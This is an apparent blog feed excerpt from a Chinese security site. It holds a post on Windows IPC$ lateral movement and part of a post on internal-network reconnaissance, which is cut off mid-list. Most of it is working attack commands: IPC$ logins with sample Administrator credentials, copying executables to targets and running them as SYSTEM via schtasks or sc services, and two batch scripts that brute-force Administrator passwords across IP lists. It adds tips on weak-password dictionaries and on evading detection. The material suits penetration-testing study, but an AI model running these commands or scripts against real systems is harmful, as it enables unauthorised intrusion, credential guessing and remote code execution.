    <link href="https://www.se7ensec.cn/2020/07/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E4%BA%8EIPC%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    <id>https://www.se7ensec.cn/2020/07/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E4%BA%8EIPC%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</id>
    <published>2020-07-12T07:11:24.000Z</published>
    <updated>2020-11-14T19:53:20.982Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>基于IPC的横向移动</p></blockquote><a id="more"></a><p>文章内容引用较多，尽量不说废话，注明链接的地方，请自行阅读并理解。</p><h2 id="IPC-的概念"><a href="#IPC-的概念" class="headerlink" title="IPC$的概念"></a>IPC$的概念</h2><p><code>IPC$(Internet Process Connection)</code>是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限,在远程管理计算机和查看计算机的共享资源时使用。</p><h2 id="IPC-的作用"><a href="#IPC-的作用" class="headerlink" title="IPC$的作用"></a>IPC$的作用</h2><p>利用<code>IPC$</code>，连接者可以与目标主机建立一个连接，利用这个连接，连接者可以得到目标主机上的目录结构、用户列表等信息。 </p><h2 id="IPC-的利用条件"><a href="#IPC-的利用条件" class="headerlink" title="IPC$的利用条件"></a>IPC$的利用条件</h2><h3 id="139，445端口开启"><a href="#139，445端口开启" class="headerlink" title="139，445端口开启"></a>139，445端口开启</h3><p><code>IPC$</code>连接可以实现远程登陆及对默认共享的访问，而<code>139</code>端口的开启表示<code>netbios</code>协议的应用。我们可以通过<code>139</code>和<code>445</code>端口来实现对共享文件/打印机的访问，因此一般来讲，<code>IPC$</code>连接是需要<code>139</code>或<code>445</code>端口来支持的。</p><p>注：<code> Windows</code>系统中的<code>net use ipc$</code>整个通信过程，先<code>445-&gt;137-&gt;139</code>验证，当你开启防火墙禁用<code>445</code>，发现系统命令就无法连接<code>IPC</code>了，因为根本没机会走到<code>139</code>，所以使用系统自带命令连接的<code>ipc$</code>需要同时开启这些端口 ，参考自<code>K8gege.org</code>。</p><h3 id="管理员开启了默认共享"><a href="#管理员开启了默认共享" class="headerlink" title="管理员开启了默认共享"></a>管理员开启了默认共享</h3><p>默认共享是为了方便管理员远程管理而默认开启的共享，即所有的逻辑盘<code>（C$,D$,E$...）</code>和系统目录<code>WINNT</code>或<code>WINDOWS(ADMIN$)</code>，我们通过<code>IPC</code>连接可以实现对这些默认共享的访问。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;net share</span><br><span class="line"></span><br><span class="line">共享名       资源                            注解</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">C<span class="variable">$</span>           C:\                             默认共享</span><br><span class="line">IPC<span class="variable">$</span>                                         远程 IPC</span><br><span class="line">ADMIN<span class="variable">$</span>       C:\WINDOWS                      远程管理</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><h3 id="建立远程连接时的用户权限问题"><a href="#建立远程连接时的用户权限问题" class="headerlink" title="建立远程连接时的用户权限问题"></a>建立远程连接时的用户权限问题</h3><p>这个不多说，很多文章没有介绍，是一个坑点：<a href="https://ares-x.com/2020/03/10/%E5%85%B3%E4%BA%8EIPC%E5%92%8CPTH%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E9%97%AE%E9%A2%98/">传送门-关于IPC和PTH用户权限问题</a></p><p>※即默认情况下只有域管用户有权限对<code>admin$</code>目录建立<code>IPC</code>连接，其实本地的<code>Administrator</code>用户也可以，但是默认情况下该用户是被禁用的，如果启用了该用户，那么也可以使用<code>Administrator</code>用户远程连接 </p><h4 id="IPC-连接失败常见错误号："><a href="#IPC-连接失败常见错误号：" class="headerlink" title="IPC$连接失败常见错误号："></a>IPC$连接失败常见错误号：</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">错误号 <span class="number">5</span>，拒绝访问【很可能你使用的用户不是管理员权限的，先提升权限】</span><br><span class="line">错误号 <span class="number">51</span>，Windows 无法找到网络路径【网络有问题】</span><br><span class="line">错误号 <span class="number">53</span>，找不到网络路径【ip 地址错误；目标未开机；目标 lanmanserver 服务未启动； 目标有防火墙（端口过滤）】</span><br><span class="line">错误号 <span class="number">67</span>，找不到网络名【你的 lanmanworkstation 服务未启动；目标删除了 ipc<span class="variable">$</span>；】 </span><br><span class="line">错误号 <span class="number">1219</span>，提供的凭据与已存在的凭据集冲突【你已经和对方建立了一个ipc<span class="variable">$</span>，请删除后再连】</span><br><span class="line">错误号 <span class="number">1326</span>，未知的用户名或错误密码【原因很明显了】</span><br><span class="line">错误号 <span class="number">1385</span>，登录失败：未授予用户在此计算机上的请求登录类型</span><br><span class="line">---</span><br><span class="line">情况<span class="number">1</span>：可能是你在“拒绝从网络访问这台计算机”功能中拒绝了该用户的访问，解决方法如下：</span><br><span class="line">开始--&gt;运行--&gt;gpedit.msc计算机配置--&gt;Windows设置--&gt;安全设置--&gt;本地策略--&gt;用户权利指派--&gt;拒绝从网络访问这台计算机--&gt;删除你要正常连接的用户</span><br><span class="line">情况<span class="number">2</span>：</span><br><span class="line">(<span class="number">1</span>)网络访问为：经典</span><br><span class="line">(<span class="number">2</span>)来宾账户状态：已启用，</span><br><span class="line">(<span class="number">3</span>)拒绝从网络访问这台计算机里有Guest用户或组</span><br><span class="line">(<span class="number">4</span>)你执行net use \\xxx.xxx.xxx.xxx\IPC<span class="variable">$</span> <span class="string">&quot;123456&quot;</span> /user:<span class="string">&quot;xxx&quot;</span> 输入的用户名是随便输入的，这时也会遇到这个错误信息，因为当你连接的用户不存在时，net use会默认用Guest用户来进行连接，而Guest用户已拒绝从网络访问，所以也会出现这种错误</span><br><span class="line">---</span><br><span class="line">错误号 <span class="number">1792</span>，试图登录，但是网络登录服务没有启动【目标NetLogon服务未启动[连接域控会出现此情况]】</span><br><span class="line">错误号 <span class="number">2242</span>，此用户的密码已经过期【目标有帐号策略，强制定期要求更改密码】 </span><br></pre></td></tr></table></figure><h2 id="基于IPC-的横向移动"><a href="#基于IPC-的横向移动" class="headerlink" title="基于IPC$的横向移动"></a>基于IPC$的横向移动</h2><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>.建立空连接</span><br><span class="line">net use \\<span class="number">192.168</span>.<span class="number">1.1</span>\ipc<span class="variable">$</span> <span class="string">&quot;&quot;</span> /u:<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="number">1</span>.建立正常连接</span><br><span class="line">net use \\<span class="number">192.168</span>.<span class="number">1.1</span>\ipc<span class="variable">$</span> <span class="string">&quot;1qaz@WSX&quot;</span> /user:<span class="string">&quot;Administrator&quot;</span> </span><br><span class="line"><span class="number">2</span>.查看本机连接共享情况</span><br><span class="line">net use</span><br><span class="line"><span class="number">3</span>.查看已建立连接目标主机的共享资源</span><br><span class="line">net view \\<span class="number">192.168</span>.<span class="number">1.1</span></span><br><span class="line"><span class="number">4</span>.查看目标主机时间</span><br><span class="line">net time \\<span class="number">192.168</span>.<span class="number">1.1</span></span><br><span class="line"><span class="number">5</span>.查看目标主机的NetBIOS用户（自己本机也需开启）</span><br><span class="line">nbtstat <span class="literal">-A</span> <span class="number">192.168</span>.<span class="number">1.1</span></span><br><span class="line"><span class="number">6</span>.删除本机与指定ip建立的连接</span><br><span class="line">net use \\<span class="number">192.168</span>.<span class="number">1.1</span>\ipc<span class="variable">$</span> /<span class="built_in">del</span> /y</span><br><span class="line"><span class="number">7</span>.删除本机所有已建立的连接</span><br><span class="line">net use * /<span class="built_in">del</span> /y</span><br><span class="line"><span class="number">8</span>.文件的上传下载与删除</span><br><span class="line"><span class="built_in">copy</span> plugin_update.exe \\<span class="number">192.168</span>.<span class="number">1.1</span>\c<span class="variable">$</span>\windows\temp\plugin_update.exe</span><br><span class="line">[推荐用<span class="type">xcopy</span>]:</span><br><span class="line">xcopy d:\sqlitedata\*.* \\<span class="number">192.168</span>.<span class="number">1.1</span>\c<span class="variable">$</span>\temp /E /Y /D</span><br><span class="line">（上传本地文件到目标的:c\windows\temp\目录下）</span><br><span class="line"><span class="built_in">copy</span> \\<span class="number">192.168</span>.<span class="number">1.1</span>\c<span class="variable">$</span>\plugin_update.exe c:\</span><br><span class="line">（下载目标文件到本地c盘下）</span><br><span class="line"><span class="built_in">del</span> \\<span class="number">192.168</span>.<span class="number">1.1</span>\c<span class="variable">$</span>\plugin_update.exe /F</span><br><span class="line">（删除目标文件）</span><br><span class="line"><span class="number">9</span>.创建计划任务之schtasks</span><br><span class="line">schtasks /create /tn <span class="string">&quot;plugin_update&quot;</span> /tr c:\windows\temp\plugin_update.exe /<span class="built_in">sc</span> once /st <span class="number">16</span>:<span class="number">32</span> /S <span class="number">192.168</span>.<span class="number">1.1</span> /RU System /u administrator /p <span class="string">&quot;1qaz@WSX&quot;</span></span><br><span class="line">补充<span class="number">1</span>：schtasks /create /tn <span class="string">&quot;Flash_Update&quot;</span> /tr C:\Users\Public\Flash_Update.exe /<span class="built_in">sc</span> minute /mo <span class="number">1</span> /S <span class="number">192.168</span>.<span class="number">1.1</span> /RU System /u administrator /p <span class="string">&quot;1qaz@WSX&quot;</span></span><br><span class="line">立即执行计划任务</span><br><span class="line">schtasks /run /tn <span class="string">&quot;plugin_update&quot;</span> /S <span class="number">192.168</span>.<span class="number">1.1</span> /u administrator /p <span class="string">&quot;1qaz@WSX&quot;</span></span><br><span class="line">删除计划任务</span><br><span class="line">schtasks /F /delete /tn <span class="string">&quot;plugin_update&quot;</span> /S <span class="number">192.168</span>.<span class="number">1.1</span> /u administrator /p <span class="string">&quot;1qaz@WSX&quot;</span></span><br><span class="line">计划任务远程开启默认共享&#123;注意查看目标主机时间&#125;</span><br><span class="line">schtasks /create /tn <span class="string">&quot;plugin_update&quot;</span> /tr <span class="string">&quot;cmd /c net share c<span class="variable">$</span>=c:&quot;</span> /<span class="built_in">sc</span> once /st <span class="number">16</span>:<span class="number">25</span> /S <span class="number">192.168</span>.<span class="number">1.1</span> /RU System /u administrator /p <span class="string">&quot;1qaz@WSX&quot;</span></span><br><span class="line"><span class="number">10</span>.创建计划任务之at</span><br><span class="line">（at只支持win03和部分老版本win08，一般情况下，win08<span class="literal">-SP1</span>的系统是能添加at计划任务的，但不一定执行，推荐win08及之后的系统都选择schtasks创建计划任务）</span><br><span class="line">at \\<span class="number">192.168</span>.<span class="number">1.1</span> <span class="number">14</span>:<span class="number">05</span> cmd /c <span class="string">&quot;c:\windows\temp\test.bat&quot;</span> </span><br><span class="line"><span class="number">11</span>.SC创建服务</span><br><span class="line">（需先IPC连接，添加的常规程序需要有返回值,不然启动服务时会报<span class="number">1053</span>错误）</span><br><span class="line"><span class="built_in">sc</span> \\<span class="number">192.168</span>.<span class="number">1.1</span> create shellsrv binpath= <span class="string">&quot;c:\shell.exe&quot;</span> <span class="built_in">start</span>= auto displayname= <span class="string">&quot;shellstart&quot;</span></span><br><span class="line"><span class="built_in">sc</span> \\<span class="number">192.168</span>.<span class="number">1.1</span> create test binpath= <span class="string">&quot;c:\windows\temp\test.bat&quot;</span> <span class="built_in">start</span>= auto displayname= <span class="string">&quot;shellstart&quot;</span></span><br><span class="line"><span class="built_in">sc</span> \\<span class="number">192.168</span>.<span class="number">1.1</span> <span class="built_in">start</span> shllsrv</span><br><span class="line"><span class="built_in">sc</span> \\<span class="number">192.168</span>.<span class="number">1.1</span> stop shllsrv</span><br><span class="line"><span class="built_in">sc</span> \\<span class="number">192.168</span>.<span class="number">1.1</span> delete shellsrv</span><br><span class="line"><span class="number">12</span>.删除默认共享</span><br><span class="line">net share c<span class="variable">$</span> /<span class="built_in">del</span></span><br><span class="line"><span class="number">13</span>.恢复默认共享</span><br><span class="line">net share c<span class="variable">$</span>=c:</span><br><span class="line"><span class="number">15</span>.对方的c盘映射为自己的z盘，其他盘类推(不推荐)</span><br><span class="line">net use z: \\<span class="number">192.168</span>.<span class="number">1.1</span>\c<span class="variable">$</span> <span class="string">&quot;1qaz@WSX&quot;</span> /user:<span class="string">&quot;administrator&quot;</span></span><br><span class="line"><span class="number">16</span>.删除映射的c盘，其他盘类推</span><br><span class="line">net use c: /<span class="built_in">del</span></span><br></pre></td></tr></table></figure><h3 id="批量爆破"><a href="#批量爆破" class="headerlink" title="批量爆破"></a>批量爆破</h3><p>内网中爆破弱口令时首选的便是使用<code>ipc</code>，爆破错误次数一般也不会做限制，但是一定要注意爆破成功的结果是否为匿名权限的<code>ipc</code>连接。</p><p>弱口令爆破这种手段在在内网中是一把双刃剑，如果公司领导未过于重视网络安全的话，导致信息安全部地位低下、资金有限，那么在缺乏安全设备监控与员工网络安全意识低下的情况下，在内网进行弱口令爆破是一件非常高效地事情，如大部分的央企、国企二级单位。</p><p>但另一方面，如果该公司确实在网络安全方面投入较大人力财力，那么弱口令爆破无异于自杀。</p><p>弱口令字典可由部分简单口令和部分复杂规则口令与企业名称+年份组成，如<code>12345678</code>,<code>000000</code>,<code>1q2w3e4r</code>,<code>1qaz2wsx</code>,<code>baidu@2020</code>,<code>baidu@123</code>等，不宜超过100条且建议单线程慢速爆破，避免被拦截。</p><p>使用说明：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ip.txt 放入要爆破的IP</span><br><span class="line">pass.txt 放入爆破的密码</span><br><span class="line">默认爆破用户：Administrator</span><br><span class="line">爆破成功的结果，会在bat运行的当前目录生成pic.txt</span><br><span class="line">爆破进度的查询：type log.txt，完成后当前目录生成end.txt</span><br></pre></td></tr></table></figure><p><strong>坑点：需注意特殊字符，如密码中有 <code>%</code> 需要用 <code>%</code> 来转义，例 ：<code>123#$%</code> 应转化为 <code>123#$%%</code></strong> </p><p>1.给定多个密码爆破</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">cls</span></span><br><span class="line"><span class="built_in">echo</span> Useage: %<span class="number">0</span> ip.txt pass.txt</span><br><span class="line"><span class="keyword">FOR</span> /F %%i <span class="keyword">in</span> (%<span class="number">1</span>) <span class="keyword">do</span> (</span><br><span class="line"><span class="keyword">FOR</span> /F %%p <span class="keyword">in</span> (%<span class="number">2</span>) <span class="keyword">do</span> (</span><br><span class="line"><span class="built_in">echo</span> net use \\%%i\ipc<span class="variable">$</span> <span class="string">&quot;%%p&quot;</span> /user:<span class="string">&quot;%%i\Administrator&quot;</span> &gt;&gt; log.txt</span><br><span class="line">net use \\%%i\ipc<span class="variable">$</span> <span class="string">&quot;%%p&quot;</span> /user:<span class="string">&quot;%%i\Administrator&quot;</span>  &gt;NUL <span class="number">2</span>&gt;NUL</span><br><span class="line"><span class="keyword">IF</span> NOT errorlevel <span class="number">1</span> (</span><br><span class="line"><span class="built_in">echo</span> %%p  t:%%i&gt;&gt; pic.txt</span><br><span class="line">net use \\%%i\ipc<span class="variable">$</span> /<span class="built_in">del</span></span><br><span class="line">)</span><br><span class="line">net use * /<span class="built_in">del</span> /y &gt;NUL <span class="number">2</span>&gt;NUL</span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line"><span class="built_in">echo</span> <span class="keyword">end</span> &gt;&gt; end.txt</span><br></pre></td></tr></table></figure><p>2.固定密码</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">cls</span></span><br><span class="line"><span class="built_in">echo</span> Useage: %<span class="number">0</span> ip.txt</span><br><span class="line"><span class="keyword">FOR</span> /F %%i <span class="keyword">in</span> (%<span class="number">1</span>) <span class="keyword">do</span> (</span><br><span class="line"><span class="built_in">echo</span> net use \\%%i\ipc<span class="variable">$</span> <span class="string">&quot;123456&quot;</span> /user:<span class="string">&quot;%%i\Administrator&quot;</span> &gt;&gt; log.txt</span><br><span class="line">net use \\%%i\ipc<span class="variable">$</span> <span class="string">&quot;123456&quot;</span> /user:<span class="string">&quot;%%i\Administrator&quot;</span>  &gt;NUL <span class="number">2</span>&gt;NUL</span><br><span class="line"><span class="keyword">IF</span> NOT errorlevel <span class="number">1</span> (</span><br><span class="line"><span class="built_in">echo</span> success:%%i&gt;&gt; pic.txt</span><br><span class="line">net use \\%%i\ipc<span class="variable">$</span> /<span class="built_in">del</span></span><br><span class="line">)</span><br><span class="line">net use * /<span class="built_in">del</span> /y &gt;NUL <span class="number">2</span>&gt;NUL</span><br><span class="line">)</span><br><span class="line"><span class="built_in">echo</span> <span class="keyword">end</span> &gt;&gt; end.txt</span><br></pre></td></tr></table></figure><h3 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h3><p>温馨小提示：有杀软的内网环境中，尽量用<code>windows</code>自带功能来完成需求，使用工具要慎重，一定要本地做好测试在丢到目标上运行。</p><h4 id="PSEXEC"><a href="#PSEXEC" class="headerlink" title="PSEXEC"></a>PSEXEC</h4><p>不推荐，很容易就被杀软拦截，<a href="https://download.sysinternals.com/files/PSTools.zip">微软官方pstools</a> </p><p>域渗透学习（五）基于IPC的远程连接： <a href="https://ares-x.com/2020/03/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89%E5%9F%BA%E4%BA%8EIPC%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/">https://ares-x.com/2020/03/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89%E5%9F%BA%E4%BA%8EIPC%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/</a> </p><h4 id="Impacket套件"><a href="#Impacket套件" class="headerlink" title="Impacket套件"></a>Impacket套件</h4><p>更多的连接方式还有 <code>smbexec</code>、<code>psexec</code>、<code>atexec</code>， 都可在github社区中找到，比较简单的就是在 <code>impacket</code> 工具<br>包找到相关文件，使用方法自行查阅帮助文档，这里不再赘述。</p><p>python版：<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p><p>exe版：<a href="https://github.com/ropnop/impacket_static_binaries/releases">https://github.com/ropnop/impacket_static_binaries/releases</a>    v0.9.19稳</p><p>Impacket套件之远程命令执行功能讲解： <a href="https://mp.weixin.qq.com/s/kVTAe2BLya-lwOXzKdvHGA">https://mp.weixin.qq.com/s/kVTAe2BLya-lwOXzKdvHGA</a> </p><h4 id="Ladon"><a href="#Ladon" class="headerlink" title="Ladon"></a>Ladon</h4><table><thead><tr><th align="left">模块功能</th><th align="left">目标端口</th><th align="left">目标系统</th><th align="left">使用教程</th></tr></thead><tbody><tr><td align="left">SMB爆破/IPC/共享</td><td align="left">445端口</td><td align="left">Windows</td><td align="left"><a href="http://k8gege.org/Ladon/SmbScan.html">http://k8gege.org/Ladon/SmbScan.html</a></td></tr><tr><td align="left">Netbios爆破</td><td align="left">139端口</td><td align="left">Windows</td><td align="left"><a href="http://k8gege.org/Ladon/NbtScan.html">http://k8gege.org/Ladon/NbtScan.html</a></td></tr><tr><td align="left">SMB-NtlmHash爆破</td><td align="left">445端口</td><td align="left">Windows</td><td align="left"><a href="http://k8gege.org/Ladon/SmbHashScan.html">http://k8gege.org/Ladon/SmbHashScan.html</a></td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;基于IPC的横向移动&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="内网渗透" scheme="https://www.se7ensec.cn/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透|内网中的信息收集</title>
    <link href="https://www.se7ensec.cn/2020/07/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>https://www.se7ensec.cn/2020/07/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2020-07-12T07:10:24.000Z</published>
    <updated>2020-11-14T19:53:53.820Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>无论是通过外网打点，还是水坑钓鱼，进入内网后的第一步，也是最重要的一步就是信息收集，而且信息收集往往是一直穿插在整个内网渗透过程中。</p></blockquote><a id="more"></a><h2 id="工作组和域的区分"><a href="#工作组和域的区分" class="headerlink" title="工作组和域的区分"></a>工作组和域的区分</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.ipconfig /all</span><br><span class="line">有Primary Dns Suffix（主 DNS 后缀）就说明是域内，空的则当前机器应该在工作组。</span><br><span class="line"><span class="number">2</span>.net config workstation </span><br><span class="line">=工作组特征=</span><br><span class="line">------------------------------------------------</span><br><span class="line">软件版本                      Windows <span class="number">10</span> Home China</span><br><span class="line">工作站域                       WORKGROUP</span><br><span class="line">登录域                          MicrosoftAccount</span><br><span class="line">------------------------------------------------</span><br><span class="line">=域特征=</span><br><span class="line">------------------------------------------------</span><br><span class="line">工作站域                     HACK7</span><br><span class="line">工作站域 DNS 名称            hack7.local</span><br><span class="line">登录域                       HACK7</span><br><span class="line">------------------------------------------------</span><br><span class="line"><span class="number">3</span>.systeminfo</span><br><span class="line">这里注意字体大小写，工作组一般都是全大写，但是遇到的也有小写的情况，暂时不明白怎么设置的</span><br><span class="line">=工作组特征=</span><br><span class="line">------------------------------------------------</span><br><span class="line">域:               WORKGROUP</span><br><span class="line">------------------------------------------------</span><br><span class="line">=域特征=</span><br><span class="line">------------------------------------------------</span><br><span class="line">域:               hack7.local</span><br><span class="line">------------------------------------------------</span><br><span class="line"><span class="number">4</span>.net time /domain</span><br><span class="line">=工作组特征=</span><br><span class="line">------------------------------------------------</span><br><span class="line">找不到域 WORKGROUP 的域控制器。</span><br><span class="line">请键入 NET HELPMSG <span class="number">3913</span> 以获得更多的帮助。</span><br><span class="line">------------------------------------------------</span><br><span class="line">=域特征=[需要域用户才能成功查询]</span><br><span class="line">------------------------------------------------</span><br><span class="line">\\DC.hack7.local的当前时间是<span class="number">2020</span>/<span class="number">7</span>/<span class="number">12</span> <span class="number">13</span>:<span class="number">21</span>:<span class="number">32</span></span><br><span class="line">------------------------------------------------</span><br></pre></td></tr></table></figure><h2 id="工作组内信息收集"><a href="#工作组内信息收集" class="headerlink" title="工作组内信息收集"></a>工作组内信息收集</h2><p>工作组采取的一般都是常规渗透方法，因为工作组一般都是个人和少数服务器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">通常使用的方法有：</span><br><span class="line">扫描网段中的web服务，常用的有phpstudy，wampserver等，来寻找搭建的服务漏洞</span><br><span class="line">扫描开放端口信息，以及对应的服务，判断是否存在漏洞。</span><br><span class="line">扫描主机由于没有更新到最新版本导致的系统漏洞，比如MS17-010，补丁号为KB4013389</span><br><span class="line">hash抓取，hash注入，hash碰撞，口令爆破，IPC登陆，WMI，未授权访问，文件共享系统。</span><br><span class="line">ARP嗅探&#x2F;欺骗攻击（Cain和Ettercap）</span><br><span class="line">DNS劫持，会话劫持。</span><br><span class="line">社会工程学</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h3><h4 id="用户系统信息收集"><a href="#用户系统信息收集" class="headerlink" title="用户系统信息收集"></a>用户系统信息收集</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.查看当前用户权限</span><br><span class="line">whoami /all</span><br><span class="line"><span class="number">2</span>.查看系统信息</span><br><span class="line">systeminfo</span><br><span class="line">systeminfo /S <span class="number">192.168</span>.<span class="number">1.101</span> /U testlab\test /P <span class="string">&quot;test&quot;</span> 查看远程机器的系统配置</span><br><span class="line"><span class="number">3</span>.查当前机器的机器名,知道当前机器是干什么的</span><br><span class="line">hostname</span><br><span class="line"><span class="number">4</span>.查看在线用户,注意管理员此时在不在</span><br><span class="line">quser</span><br><span class="line">query user</span><br><span class="line">qwinsta</span><br><span class="line"><span class="number">5</span>.查当前机器中所有的用户名,开始搜集准备用户名字典</span><br><span class="line">net user</span><br><span class="line"><span class="number">6</span>.查当前机器中所有的组名,了解不同组的职能,如：IT,HR,admin,file</span><br><span class="line">net localgroup</span><br><span class="line"><span class="number">7</span>.查指定组中的成员列表</span><br><span class="line">net localgroup <span class="string">&quot;Administrators&quot;</span></span><br><span class="line"><span class="number">8</span>.查询本机所有的盘符</span><br><span class="line">wmic logicaldisk get description,name,size,freespace /value</span><br><span class="line">fsutil fsinfo 